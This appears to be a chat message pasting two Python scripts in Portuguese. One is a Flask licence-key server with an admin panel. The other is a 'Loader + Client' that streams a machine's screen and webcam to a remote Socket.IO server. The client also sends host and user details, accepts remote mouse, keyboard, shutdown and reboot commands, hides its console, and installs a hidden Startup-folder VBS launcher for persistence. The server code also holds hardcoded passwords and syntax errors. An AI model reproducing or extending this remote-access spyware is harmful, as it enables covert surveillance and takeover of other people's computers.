Você disse:
#!/usr/bin/env python
# RV Solutions • Servidor de licenças + painel + auto‑update  v4.0

import os, json, time, random, string, hashlib, functools
from datetime import datetime
from flask import (
    Flask, request, jsonify, abort, render_template_string,
    redirect, url_for, session, flash, send_from_directory
)
from flask_cors import CORS
from passlib.hash import pbkdf2_sha256

# ─── Config ───
DATA_FILE   = 'keys.json'          # banco de licenças
UPD_FILE    = 'update.json'        # versão mais recente do Loader
FILES_DIR   = 'files'              # onde ficam uploads
ADMIN_USER  = 'rvadmin'
ADMIN_PASSHASH = pbkdf2_sha256.hash('mudar123')
HOST, PORT  = '0.0.0.0', 5001

app = Flask(__name__)
CORS(app)                          # libera /exists para o painel
app.secret_key = os.urandom(24)
os.makedirs(FILES_DIR, exist_ok=True)

# ─── Helpers ───
def _load(path=DATA_FILE):
    if not os.path.exists(path): json.dump({}, open(path, 'w'))
    with open(path) as f: return json.load(f)

def _save(d, path=DATA_FILE): json.dump(d, open(path, 'w'), indent=2)

def _sha(s): return hashlib.sha256(s.encode()).hexdigest()

def rnd(n=16):
    s=''.join(random.choices(string.ascii_uppercase+string.digits,k=n))
    return '-'.join([s[i:i+4] for i in range(0,n,4)])

def _login_required(fn):
    @functools.wraps(fn)
    def w(*a,**kw):
        if not session.get('logged'): return redirect(url_for('login'))
        return fn(*a,**kw)
    return w

# ─── API licenças ───
@app.post('/validate')
def validate():
    j    = request.get_json() or {}
    key  = j.get('key','').upper()
    hwid = j.get('hwid')
    rec  = _load().get(key)

    if not rec or rec['status']=='banned':
        return jsonify(ok=False, reason='INVALID'), 403
    if rec['expires'] and time.time()>rec['expires']:
        return jsonify(ok=False, reason='EXPIRED'), 403

    # admin key → pula verificação HWID
    if rec.get('type','single') == 'admin':
        token=_sha(key+str(rec['expires']))
        return jsonify(ok=True, token=token, expires=rec['expires'])

    # chave normal: verifica / grava HWID
    if rec['hwid'] and rec['hwid']!=hwid:
        return jsonify(ok=False, reason='HWID_MISMATCH'), 403
    if not rec['hwid']:
        rec['hwid']=hwid; _save(_load())          # grava HWID

    token=_sha(key+hwid+str(rec['expires']))
    return jsonify(ok=True, token=token, expires=rec['expires'])

# usado pelo painel HTML para checar existência
@app.get('/exists/<key>')
def exists(key):
    rec=_load().get(key.upper())
    if rec and rec.get('status','active')!='banned':
        return jsonify(exists=True)
    return jsonify(exists=False), 404

# ─── API atualização ───
@app.get('/latest')
def latest(): return jsonify(_load(UPD_FILE) or {})

@app.post('/set_update'); @_login_required
def set_update():
    ver=request.form['ver'].strip()
    url=request.form['url'].strip()
    if 'file' in request.files and request.files['file'].filename:
        f=request.files['file']
        fname=f"{int(time.time())}_{f.filename}"
        path=os.path.join(FILES_DIR,fname)
        f.save(path)
        url=request.url_root.rstrip('/')+url_for('download',fname=fname).lstrip('/')
    _save({'version':ver,'url':url}, UPD_FILE)
    flash('Atualização publicada.','success')
    return redirect('/')

@app.get('/download/<path:fname>')
def download(fname): return send_from_directory(FILES_DIR,fname,as_attachment=True)

# ─── Login ───
@app.route('/login', methods=['GET','POST'])
def login():
    if request.method=='POST':
        if (request.form['user']==ADMIN_USER
            and pbkdf2_sha256.verify(request.form['pw'],ADMIN_PASSHASH)):
            session['logged']=True; return redirect('/')
        flash('Credenciais inválidas.','danger')
    return render_template_string(TPL_LOGIN)

@app.get('/logout'); def logout(): session.clear(); return redirect('/login')

# ─── Painel principal ───
@app.get('/'); @_login_required
def panel():
    q=request.args.get('q','').upper()
    keys={k:v for k,v in _load().items() if q in k.upper()}
    upd=_load(UPD_FILE)
    return render_template_string(TPL_PANEL, keys=keys, q=q, upd=upd, time=time)

# =================== rotas chaves ===================
@app.post('/new'); @_login_required
def new():
    qty=int(request.form.get('qty',1))
    days=int(request.form.get('days',0))
    data=_load(); exp=int(time.time()+days*86400) if days else 0
    out=[]
    for _ in range(qty):
        k=rnd(); data[k]=dict(expires=exp,hwid=None,status='active',type='single')
        out.append(k)
    _save(data); flash(f'{qty} chave(s) criada(s).','success')
    session['last_keys']=out; return redirect('/')

@app.post('/new_admin'); @_login_required
def new_admin():
    qty=int(request.form.get('qty',1))
    data=_load(); out=[]
    for _ in range(qty):
        k=rnd(); data[k]=dict(expires=0,hwid=None,status='active',type='admin')
        out.append(k)
    _save(data); flash(f'{qty} chave(s) ADMIN criadas.','warning')
    session['last_keys']=out; return redirect('/')

@app.post('/edit/<key>'); @_login_required
def edit(key):
    d=_load(); exp=request.form.get('expires')
    d[key]['expires']=int(time.mktime(datetime.strptime(exp,'%Y-%m-%d').timetuple())) if exp else 0
    _save(d); flash('Chave atualizada.','success'); return redirect(f'/?q={key}')

@app.get('/toggle/<key>'); @_login_required
def toggle(key):
    d=_load(); d[key]['status']='banned' if d[key]['status']=='active' else 'active'
    _save(d); flash('Status alterado.','warning'); return redirect(f'/?q={key}')

@app.get('/del/<key>'); @_login_required
def delete(key):
    d=_load(); d.pop(key,None); _save(d); flash('Chave removida.','danger'); return redirect('/')

# ─── HTML (Jinja2) ───
TPL_LOGIN = """<!doctype html><title>Login</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<div class=container style="max-width:420px">
  <h3 class="text-center my-4">Painel RV</h3>
  {% with m=get_flashed_messages(with_categories=1) %}
    {% for c,t in m %}<div class="alert alert-{{c}}">{{t}}</div>{% endfor %}{% endwith %}
  <form method=post class="border rounded p-4 shadow">
    <input name=user class=form-control placeholder=Usuário autofocus><br>
    <input name=pw type=password class=form-control placeholder=Senha><br>
    <button class="btn btn-primary w-100">Entrar</button>
  </form></div>"""

TPL_PANEL = """<!doctype html><title>Painel</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<div class=container py-4>
  <div class="d-flex justify-content-between align-items-center mb-3">
    <h4>Painel de Licenças</h4>
    <a href=/logout class="btn btn-outline-dark btn-sm">Sair</a>
  </div>
  {% with m=get_flashed_messages(with_categories=1) %}
    {% for c,t in m %}<div class="alert alert-{{c}}">{{t}}</div>{% endfor %}{% endwith %}

  <!-- Busca -->
  <form class="row g-2 mb-4">
    <div class=col><input name=q value="{{q}}" class=form-control placeholder="Buscar chave"></div>
    <div class=col-auto><button class="btn btn-outline-secondary">Buscar</button></div>
  </form>

  <!-- Novas chaves single -->
  <details class=mb-4><summary class=h6>Criar chaves SINGLE</summary>
    <form class="row g-2 mt-2" method=post action=/new>
      <div class=col><input type=number name=qty min=1 value=1 class=form-control placeholder=Qtde></div>
      <div class=col><input type=number name=days min=0 value=30 class=form-control placeholder="Dias (0=vitalícia)"></div>
      <div class=col-auto><button class="btn btn-success">Gerar</button></div>
    </form>
  </details>

  <!-- Novas chaves admin -->
  <details class=mb-4><summary class=h6>Criar chaves ADMIN (multi‑PC)</summary>
    <form class="row g-2 mt-2" method=post action=/new_admin>
      <div class=col><input type=number name=qty min=1 value=1 class=form-control placeholder=Qtde></div>
      <div class=col-auto><button class="btn btn-warning">Gerar ADMIN</button></div>
    </form>
  </details>

  <!-- Atualização -->
  <details class=mb-4 open><summary class=h6>Nova atualização (versão atual: {{upd.version if upd else 'nenhuma'}})</summary>
    <form class="row g-2 mt-2" method=post action=/set_update enctype=multipart/form-data>
      <div class=col><input name=ver class=form-control placeholder="Versão ex: 1.2" required></div>
      <div class=col><input name=url class=form-control placeholder="URL direta (.exe) – opcional"></div>
      <div class=col><input type=file name=file class=form-control></div>
      <div class=col-auto><button class="btn btn-primary">Publicar</button></div>
    </form>
  </details>

  <!-- Tabela -->
  <table class="table table-sm table-bordered align-middle">
    <thead class=table-light><tr>
      <th>Chave</th><th>Tipo</th><th>Expira</th><th>HWID</th><th>Status</th><th style=width:120px>Ações</th></tr></thead>
    <tbody>{% for k,v in keys.items() %}
      <tr class="{% if v.status=='banned' %}table-danger{% endif %}">
        <td class=font-monospace>{{k}}</td>
        <td>{{v.type}}</td>
        <td>{% if v.expires %}{{time.strftime('%d/%m/%Y',time.localtime(v.expires))}}{% else %}<span class=text-success>Vitalícia</span>{% endif %}</td>
        <td class=font-monospace>{{v.hwid or '-'}}</td>
        <td>{{v.status}}</td>
        <td>
          <a class="btn btn-sm btn-outline-primary" data-bs-toggle=modal href="#e{{loop.index}}">Editar</a>
          <a href="/toggle/{{k}}" class="btn btn-sm btn-outline-warning">Ban</a>
          <a href="/del/{{k}}" class="btn btn-sm btn-outline-danger" onclick="return confirm('Excluir {{k}}?')">Del</a>
          <!-- modal editar -->
          <div class="modal fade" id="e{{loop.index}}">
            <div class="modal-dialog modal-dialog-centered"><div class="modal-content p-3">
              <form method=post action="/edit/{{k}}">
                <h6>Expiração de {{k}}</h6>
                <input type=date name=expires value="{{'' if not v.expires else time.strftime('%Y-%m-%d',time.localtime(v.expires))}}" class=form-control mb-3>
                <button class="btn btn-primary">Salvar</button>
              </form></div></div></div>
        </td></tr>{% else %}
      <tr><td colspan=6 class=text-center>Nenhuma chave.</td></tr>{% endfor %}
    </tbody></table>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
"""

# ─── main ───
if __name__ == '__main__':
    print(f'» Painel em http://{HOST}:{PORT}  (login: {ADMIN_USER})')
    app.run(host=HOST, port=PORT)

#!/usr/bin/env python
# RV Solutions · Loader + Client (v3.4‑cmd‑LIC)
# • Interface CLI
# • Licenciamento por chave (rvkeys.onrender.com)
# • Opções 1‑5 para controlar o cliente remoto

import os, sys, time, uuid, base64, socket, platform, subprocess, \
       threading, logging, ctypes, tempfile, getpass, json, hashlib, requests

# ───────────── Configurações ─────────────
SERVER        = 'https://edusp.onrender.com'      # seu servidor Socket.IO
ROLE          = '?role=client'
KEY_ENDPOINT  = 'https://rvkeys.onrender.com/validate'  # ⇠ servidor de chaves
SCR_FPS = 8
CAM_FPS = 8
JPEG_Q  = 70
SEND_CAM = True

# login local (só para o menu; remova se não quiser)
LOGIN_U = 'admin'
LOGIN_P = '0312'

LOG_PATH = os.path.join(tempfile.gettempdir(), "RVLoader.log")
logging.basicConfig(filename=LOG_PATH, level=logging.DEBUG,
                    format="%(asctime)s [%(levelname)s] %(message)s")

# ───────────── Variáveis globais ─────────────
proc = None
console_hwnd = None
KEY_FILE = os.path.join(os.path.dirname(__file__), '.rv_key')

# ───────────── Licenciamento ─────────────
def get_hwid() -> str:
    return uuid.uuid3(uuid.NAMESPACE_DNS,
                      platform.node() + platform.platform()).hex

def solicitar_chave() -> str:
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE) as f:
            k = f.read().strip()
            if k: return k
    k = input("Chave de licença: ").strip().upper()
    with open(KEY_FILE, 'w') as f: f.write(k)
    return k

def validar_chave() -> None:
    key  = solicitar_chave()
    hwid = get_hwid()
    try:
        resp = requests.post(KEY_ENDPOINT,
                             json={'key': key, 'hwid': hwid},
                             timeout=10)
    except Exception as e:
        print(f"Falha de rede na verificação da licença: {e}")
        sys.exit(2)

    if resp.status_code != 200:
        motivo = resp.json().get('reason', 'ERRO')
        print(f"Licença recusada: {motivo}")
        os.remove(KEY_FILE)
        sys.exit(3)

    data = resp.json()
    exp  = data['expires']
    token= data['token']    # não usamos agora, mas pode guardar se quiser
    print("Licença OK." + ("" if exp == 0 else
          f" Expira em {time.strftime('%d/%m/%Y', time.localtime(exp))}."))

# ───────────── Utilidades ─────────────
def get_pythonw():
    """Quando congelado devolve o próprio EXE; senão, pythonw.exe."""
    if getattr(sys, 'frozen', False):
        return sys.executable
    pyw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
    return pyw if os.path.exists(pyw) else sys.executable

# ───────────── Cliente Socket.IO ─────────────
def run_client():
    logging.basicConfig(level=logging.INFO,
                        format='[%(levelname)s] %(message)s')
    try:
        import cv2, numpy as np
        from mss import mss
        import psutil, socketio, pyautogui, winsound, websocket, engineio.async_drivers.threading
    except ModuleNotFoundError as e:
        logging.error(f'Dependência ausente: {e.name}')
        time.sleep(4)
        return

    try: import vlc;  AUDIO = 'vlc'
    except: AUDIO = 'winsound' if hasattr(winsound, 'PlaySound') else None

    def hwinfo():
        vm = psutil.virtual_memory(); du = psutil.disk_usage('/')
        return dict(
            hostname=socket.gethostname(),
            user=os.getlogin(),
            os=platform.platform(),
            hwid=get_hwid(),
            ip_local=socket.gethostbyname(socket.gethostname()),
            cpu=f'{psutil.cpu_count(False)}c/{psutil.cpu_count()}t',
            cpu_load=psutil.cpu_percent(),
            ram_tot=round(vm.total/2**30,1),
            ram_free=round(vm.available/2**30,1),
            disk_tot=round(du.total/2**30,1),
            disk_free=round(du.free/2**30,1)
        )

    b64 = lambda b: 'data:image/jpeg;base64,'+base64.b64encode(b).decode()
    def jpg(frame):
        ok, buf = cv2.imencode('.jpg', frame,
                               [int(cv2.IMWRITE_JPEG_QUALITY), JPEG_Q])
        return buf.tobytes() if ok else None

    sio = socketio.Client(logger=False)

    @sio.event
    def connect():
        global MON_W, MON_H
        logging.info('Conectado')
        sio.emit('id', 'python-client')
        sio.emit('hwinfo', hwinfo())
        try:
            with mss() as s:
                MON_W = s.monitors[1]['width']
                MON_H = s.monitors[1]['height']
        except: pass

    @sio.on('request-hwinfo')
    def _req(_): sio.emit('hwinfo', hwinfo())

    def _pow(cmd):
        if platform.system() == 'Windows':
            subprocess.run(cmd, check=False)
        else:
            os.system('sudo '+' '.join(cmd))

    @sio.on('shutdown')
    def _shut(_): _pow(['shutdown','/s','/t','0'])

    @sio.on('reboot')
    def _reb(_):  _pow(['shutdown','/r','/t','0'])

    @sio.on('play-audio')
    def _play(d):
        url, delay = d.get('url'), d.get('delay', 0)
        if not url or not AUDIO: return
        def _do():
            if AUDIO == 'vlc': vlc.MediaPlayer(url).play()
            else: winsound.PlaySound(url,
                                     winsound.SND_FILENAME|winsound.SND_ASYNC)
        threading.Timer(delay, _do).start()

    @sio.on('mouse-event')
    def _mouse(e):
        t=e['type']
        if t=='move':
            pyautogui.moveTo(int(e['xp']*MON_W),int(e['yp']*MON_H))
        elif t=='click':
            pyautogui.click(button=e.get('btn','left'))
        elif t=='scroll':
            pyautogui.scroll(int(e.get('dy',0)))

    @sio.on('key-event')
    def _key(e):
        k,act=e['key'],e.get('action','press')
        if act=='press':   pyautogui.keyDown(k)
        elif act=='release': pyautogui.keyUp(k)
        else:                pyautogui.press(k)

    @sio.on('crash-browser')
    def _crash(_): os._exit(0)

    def cam_loop():
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened(): return
        while sio.connected:
            ok, frame = cap.read()
            if ok: sio.emit('frame', b64(jpg(frame)))
            time.sleep(1/CAM_FPS)
        cap.release()

    def screen_loop():
        with mss() as sct:
            mon = sct.monitors[1]
            while sio.connected:
                img = sct.grab(mon)
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                sio.emit('screen-frame', b64(jpg(frame)))
                time.sleep(1/SCR_FPS)

    try:
        sio.connect(SERVER+ROLE, transports=['websocket','polling'])
    except Exception as e:
        logging.error(f'Falha na conexão: {e}')
        time.sleep(4); return

    threading.Thread(target=screen_loop, daemon=True).start()
    if SEND_CAM:
        threading.Thread(target=cam_loop, daemon=True).start()
    sio.wait()

# ───────────── Funções do Loader ─────────────
def iniciar_cliente():
    global proc
    if proc and proc.poll() is None:
        print("» Cliente já está em execução."); return
    cmd = [sys.executable, '--client'] if getattr(sys,'frozen',False) \
          else [sys.executable, os.path.abspath(__file__), '--client']
    proc = subprocess.Popen(cmd, creationflags=getattr(subprocess,
                               "CREATE_NEW_CONSOLE", 0))
    print("» Cliente iniciado.")

def ocultar_mostrar_console():
    global console_hwnd
    if not proc or proc.poll() is not None:
        print("» Nenhum cliente em execução."); return
    try:
        import win32gui, win32process
    except ImportError:
        print("» pywin32 não instalado (função indisponível)."); return
    if not console_hwnd:
        pid = proc.pid
        def _enum(hwnd,_):
            if win32process.GetWindowThreadProcessId(hwnd)[1]==pid and \
               win32gui.GetClassName(hwnd)=="ConsoleWindowClass":
                globals()['console_hwnd']=hwnd
        win32gui.EnumWindows(_enum,None)
        if not console_hwnd:
            print("» Não achei a janela do console do cliente."); return
    vis = ctypes.windll.user32.IsWindowVisible(console_hwnd)
    ctypes.windll.user32.ShowWindow(console_hwnd, 0 if vis else 1)
    print("» Console oculto." if vis else "» Console mostrado.")

def fixar_inicio():
    pasta = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
    os.makedirs(pasta, exist_ok=True)
    vbs = os.path.join(pasta, "RVLoader.vbs")
    with open(vbs,'w',encoding='utf-8') as f:
        f.write("Set o=CreateObject(\"WScript.Shell\")\n"
                f"o.Run Chr(34) & \"{get_pythonw()}\" & Chr(34) & \" --client\",0,False\n")
    print("» Loader fixado na inicialização do Windows.")

def encerrar_cliente():
    global proc
    if proc and proc.poll() is None:
        proc.terminate(); proc=None
        print("» Cliente encerrado.")
    else:
        print("» Nenhum cliente em execução.")

# ───────────── Menus ─────────────
def menu_principal():
    MENU = """
╔════════════════════════════════╗
║   RV Solutions – Loader CLI    ║
╠════════════════════════════════╣
║ 1. Iniciar Cliente             ║
║ 2. Ocultar/Mostrar Console     ║
║ 3. Fixar no Início (startup)   ║
║ 4. Encerrar Cliente            ║
║ 5. Sair                        ║
╚════════════════════════════════╝
Selecione: """
    while True:
        try:
            op = input(MENU).strip()
        except (EOFError, KeyboardInterrupt):
            op = '5'
        if   op == '1': iniciar_cliente()
        elif op == '2': ocultar_mostrar_console()
        elif op == '3': fixar_inicio()
        elif op == '4': encerrar_cliente()
        elif op == '5': break
        else: print("» Opção inválida.")

# ───────────── Execução direta do cliente ─────────────
if len(sys.argv) > 1 and sys.argv[1] == '--client':
    run_client(); sys.exit(0)

# ───────────── Fluxo principal ─────────────
validar_chave()   # ← verifica a licença antes de qualquer coisa

try:
    print("RV Solutions Loader – v3.4 (CLI‑LIC)")
    u = input("Usuário: ").strip()
    p = getpass.getpass("Senha : ").strip()
    if (u, p) != (LOGIN_U, LOGIN_P):
        print("Credenciais incorretas!"); sys.exit(1)
    print("Login OK.\n")
    menu_principal()
finally:
    encerrar_cliente()
    print("Encerrado.")
